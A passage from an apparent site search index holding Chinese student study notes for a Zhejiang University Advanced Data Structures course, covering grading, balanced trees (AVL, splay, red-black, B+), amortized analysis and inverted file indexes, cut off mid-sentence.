<ol> <li>\u5434\u6069\u8fbe\u673a\u5668\u5b66\u4e60</li> <li>\u674e\u5b8f\u6bc5\u673a\u5668\u5b66\u4e60</li> </ol> <p>\u8fd9\u4e24\u95e8\u8bfe\u90fd\u662f\u6bd4\u8f83\u597d\u7684\uff0c\u5434\u6069\u8fbe\u8001\u5e08\u7684\u673a\u5668\u5b66\u4e60\u76f8\u5bf9\u57fa\u7840\uff0c\u9002\u5408\u5165\u95e8\uff1b\u674e\u5b8f\u6bc5\u8001\u5e08\u7684\u673a\u5668\u5b66\u4e60\u8986\u76d6\u8303\u56f4\u66f4\u5e7f\uff0c\u4e5f\u5305\u62ec\u4e86\u4e0d\u5c11\u6df1\u5ea6\u5b66\u4e60\u7684\u5185\u5bb9\uff0c\u5e76\u4e14\u662f\u4e2d\u6587\u6388\u8bfe\u3002</p>"},{"location":"ZJU-course/ADS/ADS/","title":"\u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5","text":"<p>ADS\u5b66\u4e60\u7b14\u8bb0</p> <p>\u4e13\u4e1a\u5b66\u5230\u73b0\u5728\u6700\u96be\u7684\u8bfe\u7a0b\uff0c\u6ca1\u6709\u4e4b\u4e00\uff0c\u5373\u4fbf\u662f\u5e73\u65f6\u6709\u505a\u7b14\u8bb0\uff0c\u8003\u524d\u4e5f\u6709\u6bd4\u8f83\u5145\u8db3\u7684\u65f6\u95f4\u590d\u4e60\uff0c\u6210\u7ee9\u4f9d\u65e7\u7b97\u4e0d\u4e0a\u7406\u60f3\uff0c\u524d\u534a\u5b66\u671f\u7684\u5185\u5bb9\u6bd4\u8f83\u7b80\u5355\uff0c\u540e\u534a\u5b66\u671f\u7684\u5185\u5bb9\u6bcf\u4e2a\u4f8b\u5b50\u90fd\u9700\u8981\u6df1\u5165\u7406\u89e3\u6d41\u7a0b\u548c\u8bc1\u660e\uff0c\u624d\u53ef\u80fd\u83b7\u5f97\u8f83\u9ad8\u7684\u7ee9\u70b9\u3002\u6211Ads\u662f\u9648\u8001\u5e08\u73ed\u7684\uff0c\u5e73\u65f6\u7684\u4f53\u9a8c\u8fd8\u662f\u5f88\u597d\u7684\uff0c\u6709\u53d1\u8a00\u52a0\u5206\uff0c\u53d1\u4e2a\u4e24\u4e09\u6b21\u5e73\u65f6\u5206\u5c31\u5f88\u597d\u6ee1\uff0cpre\u7684\u65f6\u5019\u9648\u8001\u5e08\u4e5f\u5f88\u5bbd\u5bb9\uff0c\u4f46\u51e1\u80fd\u7ba1\u4f4f\u81ea\u5df1\u4e0d\u6284\u7f16\u7a0b\u9898\u7684\uff0c\u5f3a\u70c8\u5efa\u8bae\u9009\u9648\u8d8a\u8001\u5e08\u3002</p>"},{"location":"ZJU-course/ADS/ADS/#_2","title":"\u8bfe\u7a0b\u6982\u51b5","text":"<p>\u8bc4\u5206\uff1a</p> <ul> <li>homework 5 + quiz 5\uff08\u6bcf\u6b21\u4e0a\u8bfe\u5f00\u59cb10\u5206\u949f\uff0cpta\u6709\u4e2aquiz\uff0c\u4e3b\u8981\u770b\u4f60\u8bfe\u542c\u4e86\u6ca1\u6709\uff09</li> <li>discussion 10\uff08\u4e24\u4eba\u4e00\u7ec4\uff0c\u9009\u62e9\u4e0a\u53f0\u5206\u4eab\uff0c\u4f46\u4e00\u5b9a\u9700\u8981\u4ea4\u4e00\u4e2a\u5f00\u653e\u6027\u7684\u7b54\u6848\uff09</li> <li>proj + pre review 30 \uff08\u4e00\u5b66\u671f\u67098\u4e2a\u8bfe\u9898\uff0c2\u4eba\u4e00\u7ec4\uff0c\u9009\u4e24\u4e2a\uff0c\u4e0a\u53f0\u4e24\u6b21\uff0creport\u4e0d\u9650\u5236\u53ef\u4ee5bonus\uff0c\u6bcf\u6b21peer review\u8981\u770b\u4e24\u4e2a\u62a5\u544a\uff09</li> <li>\u671f\u4e2d 10</li> <li>\u671f\u672b 40 \u53ef\u8986\u76d6\u671f\u4e2d\uff0c100\u5206\u5377\u9762\uff0c40\u65a9\u6740</li> </ul> <p>\u5173\u4e8e\u9648\u8d8a\u8001\u5e08\u73ed\u6240\u591a\u6b21\u5f3a\u8c03\u7684Pre\u8981\u6c42</p> <ol> <li>\u9700\u8981\u505aPPT\uff0c\u5b57\u4f53\u8981\u5927\uff0c\u4e0d\u53ef\u5c0f\u4e8e24\u53f7\u5b57\uff0c\u5c3d\u91cf\u4e0d\u8981\u622a\u56fe\u4ee3\u7801\u548c\u4e25\u7981\u592a\u5c0f\u7684\u6570\u5b57\u622a\u56fe</li> <li>\u7b97\u6cd5\u7684\u6b63\u786e\u6027\u5fc5\u987b\u6d4b\u8bd5</li> <li>\u6d4b\u8bd5\u6570\u636e\u7684\u751f\u6210\u6709\u5fc5\u8981\u8bf4\u660e</li> </ol>"},{"location":"ZJU-course/ADS/ADS/#1-balanced-tree","title":"1. Balanced tree","text":"<p>tree\u7684\u4f18\u52bf\u5728\u4e8e\u5904\u7406\u52a8\u6001\u7684\u4fe1\u606f</p>"},{"location":"ZJU-course/ADS/ADS/#11-avl-tree","title":"1.1 AVL tree","text":"<p>speed up searching, insertion and deletion</p> <p>\u6811T\u662f\u5e73\u8861\u7684\u6761\u4ef6\u662f</p> <ul> <li>TL \u548c TR \u662f\u5e73\u8861\u7684</li> <li>|hL - hR| &lt;= 1</li> </ul> <p>\u7a7a\u6811\u9ad8\u5ea6\u4e3a -1</p> <p>BF(node) = hL - hR</p> <p>\u53d1\u73b0\u95ee\u9898</p> <p>\u63d2\u5165\u7684\u8fc7\u7a0b\u4e4b\u540e\u4f1a\u4ece\u4e0b\u5f80\u4e0a\u66f4\u65b0BF\uff0c\u901a\u8fc7BF\u6765\u53d1\u73b0\u95ee\u9898\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u88ab\u7834\u574f\u7684node</p> <p>\u89e3\u51b3\u95ee\u9898</p> <p>\u89e3\u51b3\u5b8c\u4e4b\u540e\u6811\u9ad8\u4e0d\u53d8\uff0c\u56e0\u6b64\u5c40\u90e8\u95ee\u9898\u4e0d\u6269\u6563\uff0c\u5c31\u662f\u8bf4\u4f8b\u5982\u63d2\u5165\u4e4b\u524d\u8fd9\u6bb5\u5b50\u6811\u9ad8\u4e3a 2\uff0c\u63d2\u5165\u65cb\u8f6c\u5b8c\u9ad8\u4e3a 2</p> <p>\u53ea\u9488\u5bf9touble finder\u4e09\u4e2a\u8282\u70b9</p> <p>RR rotation \u662f\u5de6\u65cb</p> <p>LL rotation \u662f\u53f3\u65cb</p> <p>LR\u548cRL \u662f\u53cc\u65cb</p> <p>\u5220\u9664\u6709\u6982\u7387\u9700\u8981\u65cb\u8f6c\u591a\u4e2a\u8282\u70b9</p>"},{"location":"ZJU-course/ADS/ADS/#12-splay-tree","title":"1.2 splay tree","text":"<p>AVL\u7684\u53d8\u79cd\uff0cM\u6b21\u8fde\u7eed\u7684\u5220\u9664\u6216\u63d2\u5165\u64cd\u4f5c\uff0c\u603b\u65f6\u95f4\u590d\u6742\u5ea6O\uff08MlogN\uff09</p> <p>amortized time is Ologn</p> <p>\u8fd9\u4e5f\u8981\u6c42\u4e86\u4efb\u610f\u4e00\u4e2a\u64cd\u4f5c\uff0c\u90fd\u8981\u6539\u53d8\u6811</p> <p>\u6bcf\u4e00\u6b21\u8bbf\u95ee\u4e00\u4e2anode\u5c31 \u7528\u53cc\u65cb\u5c06\u5176\u8f6c\u6362\u5230root\uff0c\u5411\u4e0a\u770b\u4e24\u5c42</p> <p>X(\u8bbf\u95ee\u7684\u7ed3\u70b9) P G</p> <p>deletion</p> <ul> <li>find x \u4f1a\u63a8\u5230root\u5148</li> <li>remove x \u751f\u6210\u4e24\u68f5\u6811</li> <li>findMax(TL) \u6b64\u65f6\u8fd9\u4e2amax\u5c31\u4f1a\u88ab\u63a8\u5230 root of left tree \u6b64\u65f6\u5c31\u53ef\u4ee5\u628a\u53f3\u5b50\u6811\u62fc\u63a5\u8d77\u6765</li> </ul>"},{"location":"ZJU-course/ADS/ADS/#13","title":"1.3 \u644a\u8fd8\u5206\u6790","text":"<ul> <li>\u4efb\u610f\u8fde\u7eed\u8db3\u591f\u591a\u4e2a\u64cd\u4f5c</li> <li>\u53d6\u6700\u5927</li> </ul> <p>\u5b9a\u4e49\u52bf\u51fd\u6570 -&gt; \u5b58\u6b3e\u4f59\u989d  \u4e00\u5b9a\u533a\u95f4\u5185\u7684\uff08\u5b58\u6b3e-\u82b1\u8d39\uff09</p> <p>worst-case bound &gt;= amortized bound &gt;= average-case bound</p> <p>\u5bf9\u4e8eamortized \u7684\u5206\u6790\u6709\u5f88\u591a\u65b9\u6cd5</p> <p>aggregate analysis</p> <p>accounting method</p> <p>potential method</p>"},{"location":"ZJU-course/ADS/ADS/#14-red-black-tree","title":"1.4 red-black tree","text":"<p>\u7ea2\u9ed1\u6811\u7684\u6027\u8d28\u8bf4\u660e</p> <p>red-black tree is a balanced binary search tree</p> <p>\u7ea2\u9ed1\u6811\u7684\u7ed3\u70b9\u5305\u62ec</p> <ul> <li>parent\u6307\u9488</li> <li>left\uff0cright\u6307\u9488</li> <li>value</li> <li>color</li> </ul> <p>\u7ea2\u9ed1\u6811\u6709\u4ee5\u4e0b\u6027\u8d28</p> <ul> <li>\u6bcf\u4e2a\u8282\u70b9\u662fred or black</li> <li>\u6839\u8282\u70b9\u662f black</li> <li>\u53f6\u5b50\u8282\u70b9\u662fblack \uff08\u6b64\u5904\u7684\u53f6\u5b50\u8282\u70b9\u4e0e\u4e00\u822c\u7684\u6709\u6240\u5dee\u522b\uff0c\u7ea2\u9ed1\u6811\u5c06\u4efb\u610f\u4e00\u4e2aNULL pointer\u89c6\u4f5c\u4e00\u4e2ablack\u7684\u53f6\u5b50\u8282\u70b9\uff09</li> <li>\u82e5\u4e00\u4e2a\u8282\u70b9\u662fred\uff0c\u5219\u5b83\u7684\u5b69\u5b50\u90fd\u662fblack</li> <li>\u5bf9\u4e8e\u4efb\u610f\u8282\u70b9\uff0c\u6240\u6709\u5230\u8fbe\u5176\u540e\u4ee3\u53f6\u5b50\u8282\u70b9\u7684\u7b80\u5355\u8def\u5f84\u5305\u542b\u76f8\u540c\u6570\u91cf\u7684black nodes</li> </ul> <p>internal node \u662f\u6307\u7ea2\u9ed1\u6811\u4e0a\u771f\u6b63\u7684\u7ed3\u70b9 external node s\u662f\u6307\u90a3\u4e9b\u88ab\u89c6\u4e3a\u53f6\u5b50\u8282\u70b9\u7684\u7a7a\u6307\u9488</p> <p>black-height \u662f\u6307\u5bf9\u4e8e\u4e00\u4e2a\u8282\u70b9\u800c\u8a00\uff0c\u5176\u5230\u53f6\u5b50\u8282\u70b9\u7684\u8def\u5f84\u4e0a\u6240\u6709\u7684\u9ed1\u8272\u8282\u70b9\u6570\u91cf\uff08\u8be5\u8282\u70b9\u672c\u8eab\u4e0d\u88ab\u8ba1\u7b97\u5728\u5185\uff09</p> <p>bh(tree) = bh(root) \u53ef\u4ee5\u8bc1\u660e\u6709N\u4e2a\u8282\u70b9\u7684\u7ea2\u9ed1\u6811 \u5176\u6811\u9ad8 &lt;= 2ln(N+1)</p> <p>\u7ea2\u9ed1\u6811\u7684\u6548\u7387\u8bc1\u660e</p> <p>\u76f4\u89c2\u6765\u770b\uff0c\u7ea2\u9ed1\u6811\u786e\u4fdd\u4e86\u4ece\u4efb\u610f\u8282\u70b9\u5230\u53f6\u5b50\u8282\u70b9\u7684\u8def\u5f84\u957f\u5ea6L\uff0c\u6ee1\u8db3\uff08Lmax &lt;= 2 * Lmin\uff09</p> <p>insertion</p> <p>\u7ea2\u9ed1\u6811\u7684\u6838\u5fc3\u5728\u4e8e\u7ef4\u6301\u9ed1\u9ad8\uff0c\u56e0\u6b64\u6211\u4eec\u4e8b\u5148\u628a\u65b0\u7684\u8282\u70b9\u8bbe\u7f6e\u4e3a red</p> <p>\u5b58\u5728\u4e00\u4e9b\u4e0d\u540c\u7684\u60c5\u5f62</p> <ol> <li>\u5728\u9ed1\u8272\u8282\u70b9\u7684\u5b69\u5b50\u5904\u63d2\u5165\u7ea2\u8272\u8282\u70b9\uff0c\u6ca1\u6709\u95ee\u9898</li> <li> <p>\u5728\u7ea2\u8272\u8282\u70b9\u7684\u5b69\u5b50\u5904\u63d2\u5165\u7ea2\u8272\u8282\u70b9\uff0c\u8fd9\u91cc\u4f1a\u6709\u591a\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u8bbe\u7f6e\u63d2\u5165\u8282\u70b9\u4e3aN\uff08\u8fd9\u91cc\u8981\u6ce8\u610f\u7684\u662f\uff0cN\u672a\u5fc5\u662f\u63d2\u5165\u8282\u70b9\uff0c\u4e5f\u6709\u53ef\u80fd\u662f\u56e0\u4e3a\u5b50\u6811\u4e2d\u63d2\u5165\u8282\u70b9\u540e\u8c03\u6574\u5bfc\u81f4N\u53d8\u4e3a\u7ea2\u8272\u7684\u60c5\u5f62\uff09\uff0c\u7236\u4eb2\u7ed3\u70b9\u4e3aP\uff0c\u7956\u7236\u8282\u70b9\u4e3aG\uff0c\u7236\u4eb2\u7ed3\u70b9\u7684\u5144\u5f1f\u4e3aU     \u5df2\u77e5N is red, P is red, G is black \u8fd9\u4e09\u4e2a\u521d\u59cb\u6761\u4ef6\u662f\u786e\u5b9a\u7684</p> <ol> <li>U is red \u6211\u4eec\u76f4\u63a5\u5c06G\u53d8\u4e3ared\uff0c\u7136\u540e\u5c06P\u548cU\u90fd\u8bbe\u7f6e\u6210black\uff0c\u8fd9\u6837\u9ed1\u9ad8\u5c31\u88ab\u7ef4\u6301\u4e86\uff0c\u4f46\u7531\u4e8eG\u53d8\u4e3a\u4e86red\uff0c\u9700\u8981\u5411\u4e0a\u9012\u5f52\u64cd\u4f5c</li> <li>U is black \u5e76\u4e14 N \u662f P \u7684\u53f3\u5b69\u5b50  \u5bf9P\u8fdb\u884c\u5de6\u65cb\uff0c\u8f6c\u6362\u6210case3</li> <li>U is black \u5e76\u4e14 N \u662f P \u7684\u5de6\u5b69\u5b50  \u5bf9G\u8fdb\u884c\u53f3\u65cb\uff0c\u5e76\u4e14P\uff0cG\u4ea4\u6362\u989c\u8272\uff0c\u6027\u8d28\u6062\u590d</li> <li>\u5728\u4e0a\u8ff0\u76842.1\u60c5\u51b5\u4e0b\uff0c\u82e5P\u662f\u6839\u8282\u70b9\uff0c\u8981\u5c06\u5176\u91cd\u65b0\u8bbe\u7f6e\u4e3a\u9ed1\u8272\uff0c\u6b64\u65f6\u5168\u6811\u7684\u9ed1\u9ad8+1</li> </ol> </li> </ol> <p>\u200b\u200b</p> <p>\u200d</p> <p>\u81ea\u9876\u5411\u4e0b\u7684\u63d2\u5165</p> <p>deletion</p> <p>\u5bf9\u4e8eAVL-tree\u800c\u8a00\uff0cdeletion\u5e76\u4e0d\u4e00\u5b9a\u80fd\u4fdd\u6301\u5c40\u90e8\u6027\uff0c\u5b58\u5728\u9012\u5f52\u5411\u4e0arotation\u7684\u53ef\u80fd\uff0c\u800cred-black tree\u6700\u591a\u9700\u8981\u4e09\u6b21rotation\u6765\u5b8c\u6210</p> <p>\u5bf9\u4e8e\u5220\u9664\u64cd\u4f5c\u800c\u8a00\uff0c\u6211\u4eec\u53ea\u9700\u8003\u8651\u8981\u5220\u9664\u7684\u90a3\u4e2anode\u662fblack\u7684\u60c5\u5f62\uff0c\u53ea\u6709\u8fd9\u79cd\u60c5\u51b5\u5f71\u54cd\u9ed1\u9ad8</p> <p>\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u8981\u5220\u9664\u7684node\u6211\u4eec\u8bbe\u5176\u4e3aD</p> <ol> <li>D \u6709\u5de6\u5b69\u5b50\uff0c\u65e0\u53f3\u5b69\u5b50\uff0c\u6b64\u65f6D\u5fc5\u5b9a\u4e3ablack node\u5176\u5de6\u5b69\u5b50\u5fc5\u5b9a\u4e3ared node\uff08\u5426\u5219\u9ed1\u9ad8\u4e0d\u5e73\u8861\uff09\uff0c\u505a\u6cd5\u5c31\u662f\u4ea4\u6362D\u548c\u5de6\u5b69\u5b50\uff0c\u5e76\u4e14\u4ea4\u6362\u5b8c\u5269\u4e0b\u7684\u7ed3\u70b9\u4e3a\u9ed1\u8272\uff08\u539f\u672c\u8fd9\u5757\u5730\u65b9\u7684\u9ed1\u9ad8\u5c31\u662f1\uff09</li> <li>D \u6709\u53f3\u5b69\u5b50\uff0c\u65e0\u5de6\u5b69\u5b50\uff0c\u4e0e\u4e0a\u8ff0\u60c5\u51b5\u4e00\u81f4\uff0c\u4ea4\u6362\uff0c\u6700\u540e\u7559\u4e0b\u9ed1\u8272\u8282\u70b9</li> <li>D \u540c\u65f6\u6709\u5de6\u5b69\u5b50\u548c\u53f3\u5b69\u5b50 \uff0c\u5c06D\u4e0e\u524d\u9a71\uff08\u540e\u7ee7\uff09\u8282\u70b9\u505a\u503c\u7684\u4ea4\u6362\uff08\u4e0d\u4ea4\u6362\u989c\u8272\uff09\uff0c\u6700\u540e\u60c5\u51b5\u53ef\u4ee5\u8f6c\u6362\u4e3a1,2\u548c4</li> <li> <p>D \u4e3a\u5e38\u89c4\u610f\u4e49\u4e0a\u7684\u53f6\u5b50\u8282\u70b9\uff0c\u6b64\u65f6\u5b9a\u4e49D\u7684\u5144\u5f1f\u8282\u70b9\u4e3aS\uff0c\u5176\u5144\u5f1f\u7684\u5de6\u5b69\u5b50\u8bb0\u4e3aSL\uff0c\u53f3\u5b69\u5b50\u8bb0\u4e3aSR\uff0cDS\u7684\u7236\u8282\u70b9\u8bb0\u4f5cP\uff0c\u5047\u8bbeD\u4e3a\u7684P\u5de6\u5b69\u5b50\uff0cS\u4e3a\u53f3\u5b69\u5b50\uff0c</p> <ol> <li>\u82e5D\u4e3ared\uff0c\u76f4\u63a5\u5220\u9664</li> <li>\u82e5D\u4e3ablack\uff0cP\u4e3ablack\uff0cS\u4e3ared\uff0c\u5219SL\u548cSR\u5fc5\u5b9a\u90fd\u5b58\u5728\u4e14\u4e3ablack\uff0c\u505a\u6cd5\uff1a\u628aP\u8bbe\u7f6e\u7ea2\uff0c\u5c06S\u8bbe\u7f6e\u9ed1\uff0c\u5bf9P\u505a\u5de6\u65cb\uff0c\u672a\u89e3\u51b3</li> <li>\u82e5D\u4e3ablack\uff0cP\u4e3ared\uff0cS\uff0cSL\uff0cSR\u662fblack\uff0c\u505a\u6cd5\uff1a\u628aP\u8bbe\u7f6e\u4e3a\u9ed1\uff0cS\u8bbe\u7f6e\u4e3a\u7ea2\uff0c\u89e3\u51b3\uff0c\u5220\u9664\u539f\u59cbD</li> <li>\u82e5D\u4e3ablack\uff0cP\u4e3ablack\uff0cS\uff0cSL\uff0cSR\u5747\u4e3ablack\uff0c\u505a\u6cd5\uff1a\u628aS\u8bbe\u7f6e\u4e3a\u7ea2\uff0c\u5e76\u4e14\u5c06D\u5411\u4e0a\u9012\u5f52\uff0c\u672a\u89e3\u51b3</li> <li>\u82e5D\u4e3ablack\uff0cP\u4e3a\u672a\u77e5\u989c\u8272\uff0cS\u4e3ablack\uff0cSL\u4e3ared\uff0cSR\u4e0d\u5b58\u5728\uff0c\u505a\u6cd5\uff1aS\u8bbe\u7f6e\u4e3a\u7ea2\uff0cSL\u8bbe\u7f6e\u4e3ablack\uff0c\u5bf9S\u505a\u53f3\u65cb\uff0c\u672a\u89e3\u51b3</li> <li>\u82e5D\u4e3ablack\uff0cP\u4e3a\u672a\u77e5\u989c\u8272\uff0cS\u4e3ablack\uff0cSR\u4e3ared\uff0c\u65e0\u89c6SL\uff0c\u505a\u6cd5\uff1aP\uff0cSR\u8bbe\u7f6e\u4e3ablack\uff0cS\u8bbe\u7f6e\u4e3ared\uff0c\u5bf9P\u505a\u5de6\u65cb\uff0c\u89e3\u51b3\uff0c\u5220\u9664\u539f\u59cbD</li> </ol> </li> </ol> <p>\u200b\u200b</p> <p>AVL-tree VS RB-tree</p> <p>\u7ea2\u9ed1\u6811\u65cb\u8f6c\u7684\u6b21\u6570\u66f4\u5c11\uff0c\u4f46\u662f\u8bb0\u5f97\u6240\u6709\u64cd\u4f5c\u5bf9\u4e8e\u7ea2\u9ed1\u548cAVL\u90fd\u662fO\uff08logn\uff09</p> <p>AVL \u548c \u7ea2\u9ed1\u6811\u7684\u63d2\u5165\u64cd\u4f5c\u90fd\u662f&lt;=2\u6b21\u65cb\u8f6c</p> <p>\u4f46\u662fAVL\u7684deletion\u662fO(logN)\u6b21\u65cb\u8f6c\uff0c\u7ea2\u9ed1\u6811\u5219\u662f&lt;=3\u6b21\u65cb\u8f6c</p> <p>\u5728\u67e5\u8be2\u7684\u8868\u73b0\u4e0a\uff0cAVL\u6811\u7a0d\u5fae\u4f18\u4e8e\u7ea2\u9ed1\u6811</p>"},{"location":"ZJU-course/ADS/ADS/#15-b-tree","title":"1.5 B+ tree","text":"<p>B\u6811\u5e38\u89c1\u4e8e\u5757\u72b6\u5b58\u50a8\uff0c\u4f8b\u5982\u6587\u4ef6\u7ba1\u7406\u7cfb\u7edf\u548c\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf</p> <p>\u4e0e\u4e0a\u8ff0\u7684balanced tree\u4e0d\u540c\u7684\u662f\uff0cB+tree\u5e76\u975e\u662f\u4e8c\u53c9\u6811\uff0c\u5b83\u53ef\u4ee5\u662fM\u9636\u7684tree</p> <ul> <li>\u6839\u8282\u70b9\u662f\u53f6\u5b50\uff0c\u6216\u8005\u67092\u5230M\u4e2a\u5b69\u5b50</li> <li>\u975e\u6839\u975e\u53f6\u8282\u70b9\uff0c\u6709M/2\u7684\u4e0a\u53d6\u6574 \u5230 M \u4e2a\u5b69\u5b50</li> <li>\u53f6\u5b50\u8282\u70b9 M/2\u7684\u4e0a\u53d6\u6574 \u5230 M \u4e2a values</li> <li>\u6240\u6709\u53f6\u5b50\u90fd\u5728\u540c\u4e00\u6df1\u5ea6</li> <li>\u5de6\u5b69\u5b50\u5c0f\u4e8ekey\uff0c\u53f3\u5b69\u5b50\u5927\u4e8e\u7b49\u4e8ekey</li> </ul> <p>\u5bf9\u4e8eK\u9636B+\u6811\uff0c\u6bcf\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u53ef\u4ee5\u6709K-1\u4e2a\u6570\u503c\uff0c\u884d\u751f\u51fa\u81f3\u591aK\u4e2achildren\uff0c\u53f6\u5b50\u8282\u70b9\u81f3\u591aK\u4e2avalues</p> <p>B+ tree\u7684\u6784\u5efa\u662f\u81ea\u5e95\u5411\u4e0a</p> <p>\u6784\u5efa</p> <p>\u5176\u4ed6\u6811\u7684\u6784\u5efa\u5c31\u662f\u4ece0\u5f00\u59cb\u7684\u63d2\u5165\uff0c\u4f46\u662fB+ tree\u7684\u6784\u5efa\u662f\u4e0d\u540c\u7684\uff1f</p> <p>insert</p> <p>\u5f53\u53f6\u5b50\u8282\u70b9\u7684\u5185\u90e8\u7684value\u8fc7\u591a\u7684\u65f6\u5019\uff0c\u5c31\u628a\u53f6\u5b50\u8282\u70b9\u5206\u88c2\uff0c\u628a\u4e2d\u95f4\u6570\u636e\u79fb\u4ea4\u7ed9\u7236\u8282\u70b9</p> <p>tips \u53f6\u5b50\u8282\u70b9\u7684\u79fb\u4ea4\u662f\u5355\u7eaf\u52a0\u5230\u7236\u8282\u70b9\u4e0a\uff1b\u975e\u53f6\u5b50\u8282\u70b9\u7684\u79fb\u4ea4\u662f\u5220\u6389\u81ea\u5df1\u7684\uff0c\u4ea4\u7ed9\u7236\u8282\u70b9</p> <p>\u4e0a\u8ff0\u505a\u6cd5\u662f\u76f4\u63a5\u7684\uff0c\u4f46\u662f\u5982\u679c\u9700\u8981\u6811\u7684\u7ed3\u6784\u66f4\u52a0\u7d27\u51d1\u7684\u8bdd\uff0c\u6700\u597d\u5728\u53f6\u5b50\u8282\u70b9\u79fb\u4ea4value\u4e4b\u524d\uff0c\u5148check\u4e00\u4e0b\u6709\u65e0\u4e0d\u6ee1\u7684\u5144\u5f1f\u8282\u70b9\uff0c\u5728\u5144\u5f1f\u8282\u70b9\u5185\u90e8\u505a\u4e00\u4e9b\u64cd\u4f5c\uff0c\u4f7f\u6811\u66f4\u52a0\u6ee1</p> <p>deletion</p> <p>\u7c7b\u4f3c\u4e0einsert\uff0c\u4e0e\u5144\u5f1f\u5408\u5e76\uff0c\u591a\u4e86\u5c31\u518d\u62c6\u5206</p> <p>\u6548\u7387\u5206\u6790</p> <p>\u5bf9\u6bcf\u4e2a\u8282\u70b9\u505a\u64cd\u4f5c\uff0c\u4e5f\u5c31\u662f\u5bf9M\u7684\u6570\u7ec4\u505a\u64cd\u4f5c\uff0cO\uff08M\uff09</p> <p>\u200b\u200b</p> <p>M is 3, 4 \u662f\u4e00\u822c\u60c5\u51b5\u4e0b\u7684\u4f18\u9009</p> <p>find\u662fologn</p> <p>O(MlogM<sup>n</sup> )      \u8df3\u8868\u5904\u7406\u975e\u53f6\u5b50\u8282\u70b9\uff08\u6570\u7ec4\u4e0d\u9002\u5408\u63d2\u5165\uff0c\u94fe\u8868\u4e0d\u9002\u5408\u4e8c\u5206\u67e5\u627e\uff09</p>"},{"location":"ZJU-course/ADS/ADS/#inverted-file","title":"inverted file","text":"<p>\u5012\u6392\u7d22\u5f15\u4ea7\u751f\u65e9\u4e8e\u641c\u7d22\u5f15\u64ce\uff0c\u6b63\u6392\u7d22\u5f15\u5c31\u662f\u6839\u636e\u6587\u672c  \u5bf9\u5e94 \u5173\u952e\u8bcd</p> <p>\u4e0a\u8ff0\u7684\u6240\u6709\u5e73\u8861\u6811\u7684\u6700\u7ec8\u76ee\u7684\u90fd\u5728\u4e8e\u5efa\u7acb\u4e00\u4e2a\u826f\u597d\u7684\u641c\u7d22\u7cfb\u7edf</p> <p>\u672c\u7ae0\u6765\u8ba8\u8bba\u5982\u4f55\u5efa\u7acb\u8fd9\u6837\u4e00\u4e2a\u826f\u597d\u7684\u7cfb\u7edf</p> <p>Term-document incidence matrix</p> <p>\u5efa\u7acb\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u4e00\u7ef4\u662f\u6587\u672c\u7684\u7f16\u53f7\uff0c\u4e00\u7ef4\u662f\u5404\u79cd\u8bcd\uff0c\u8fd9\u6837\u6211\u8f93\u5165\u4e00\u4e2a\u8bcd\uff0c\u5f88\u5bb9\u6613\u80fd\u627e\u5230\u6240\u6709\u4e0e\u5176\u6709\u5173\u7684\u6587\u672c</p> <p>\u4e5f\u53ef\u4ee5\u8f7b\u677e\u5730\u67e5\u8be2\u7ec4\u5408\u7684\u6587\u672c</p> <p>\u200b\u200b</p> <p>\u95ee\u9898\u5728\u4e8e\uff0c\u4e00\u65e6\u8bcd\u7684\u8303\u56f4\u53d8\u5927\uff0c\u8fd9\u4e2a\u77e9\u9635\u6beb\u65e0\u7591\u95ee\u4f1a\u6d6a\u8d39\u5de8\u5927\u7684\u7a7a\u95f4\uff0c\u540c\u65f6\u7a00\u758f\u7684\u77e9\u9635\u4e5f\u4f1a\u4e25\u91cd\u964d\u4f4e\u67e5\u8be2\u7684\u6548\u7387</p> <p>\u8fd9\u4e2a\u95ee\u9898\u6211\u4eec\u5728\u56fe\u7684\u5b58\u50a8\u4e2d\u4e5f\u9047\u5230\u8fc7\uff0c\u6709\u4e86\u7ecf\u9a8c\u6211\u4eec\u5f88\u81ea\u7136\u4f1a\u60f3\u5230\u7528\u94fe\u8868\u6765\u5b58\u50a8</p>"},{"location":"ZJU-course/ADS/ADS/#inverted-file-index","title":"inverted file index","text":"<p>\u9996\u5148\u6765\u5b9a\u4e49index\uff0cindex\u662f\u4e00\u4e2a\u673a\u5236\u5b9a\u4f4d\u6587\u672c\u4e2d\u7684\u4e00\u4e2a\u4e8b\u7269</p> <p>inverted file \u5b58\u50a8\u8fd9\u4e00\u4e2alist\u7684\u6307\u9488\uff0c\u5bf9\u4e8e\u5728\u6587\u672c\u4e2d\u6240\u6709\u51fa\u73b0\u7684\u4e8b\u7269\uff0c\u540c\u4e0a\u6587\u7684\u8bcd\u4e00\u6837\uff0c\u6240\u6709\u7684\u8bcd\u90fd\u5bf9\u5176\u5b58\u5728\u7684\u6587\u672c\u5b58\u6709\u4e00\u4e2a\u6307\u9488</p> <p>\u200b\u200b</p> <p>\u6211\u4eec\u9664\u4e86\u5b58\u50a8\u6307\u5411\u6587\u672c\u7684\u6307\u9488\u4ee5\u5916\uff0c\u6700\u597d\u8fd8\u80fd\u5b58\u50a8\u5176\u5728\u8be5\u6587\u672c\u4e2d\u7684\u4f4d\u7f6e</p> <p>term dictionary -&gt; posting list</p> <p>\u4e4b\u6240\u4ee5\u6211\u4eec\u9664\u4e86\u6587\u672c\u6307\u9488\u548c\u4f4d\u7f6e\u4ee5\u5916\u8fd8\u8981\u5b58\u50a8\u8be5term\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u662f\u56e0\u4e3a\u5982\u679c\u8981\u591a\u4e2aterm\u4e00\u8d77\u67e5\u8be2\uff08sentence\u67e5\u8be2\uff09\u7684\u8bdd\uff0c\u6700\u597d\u662f\u4ece\u6700\u5c11\u51fa\u73b0\u7684term\u5730\u65b9\u5f00\u59cb\u68c0\u7d22</p>"},{"location":"ZJU-course/ADS/ADS/#index-generator","title":"index generator","text":"<p>\u5bf9\u4e8e\u4e0a\u8ff0\u7684index\uff0c\u6211\u4eec\u8bbe\u8ba1\u4e00\u4e2agenerator</p> <p>\u200b\u200b</p> <p>\u4e0a\u8ff0\u4ee3\u7801\u770b\u4f3c\u5f88\u7b80\u5355\uff0c\u5b9e\u9645\u5b58\u5728\u5f88\u591a\u96be\u70b9</p> <p>\u96be\u70b9\u4e00\u5728\u4e8e<code>read a term T in 